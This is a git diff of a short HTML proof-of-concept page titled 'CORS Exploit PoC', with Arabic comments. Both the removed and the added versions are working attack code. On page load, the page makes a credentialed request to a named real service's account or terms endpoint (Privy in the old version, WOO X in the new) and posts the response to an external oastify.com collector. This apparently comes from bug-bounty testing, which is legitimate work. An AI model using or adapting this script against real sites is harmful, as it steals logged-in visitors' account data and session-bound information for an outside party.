@@ -1,27 +1,27 @@
 <!DOCTYPE html>
 <html>
-  <head>
-    <title>Privy CORS Exploit</title>
-  </head>
-  <body>
-    <h2>Exploiting Privy CORS Misconfiguration...</h2>
-    <script>
-      fetch("https://dashboard.privy.io/api/v1/users/me/accept_terms", {
+<head>
+  <title>CORS Exploit PoC</title>
+</head>
+<body>
+  <h1>Testing CORS Vulnerability</h1>
+  <script>
+    fetch("https://api.woox.io/api/v1/account", {
+      method: "GET",
+      credentials: "include" // ترسل الكوكيز/التوكنات تلقائياً
+    })
+    .then(response => response.json())
+    .then(data => {
+      // إرسال البيانات إلى سيرفرك الخارجي لمراقبة النتيجة
+      fetch("https://5cic33k26wj5p43fzo2c6no8mzsqgh46.oastify.com", {
         method: "POST",
-        credentials: "include", // يرسل الـ cookies مع الطلب
         headers: {
           "Content-Type": "application/json"
         },
-        body: "{}"
-      })
-      .then(response => response.text())
-      .then(data => {
-        fetch("https://3x1u5wa0j4bso0zxrar58kl8fzlq9gx5.oastify.com", {
-          method: "POST",
-          mode: "no-cors",
-          body: data
-        });
+        body: JSON.stringify(data)
       });
-    </script>
-  </body>
+    })
+    .catch(error => console.error("Request failed:", error));
+  </script>
+</body>
 </html>
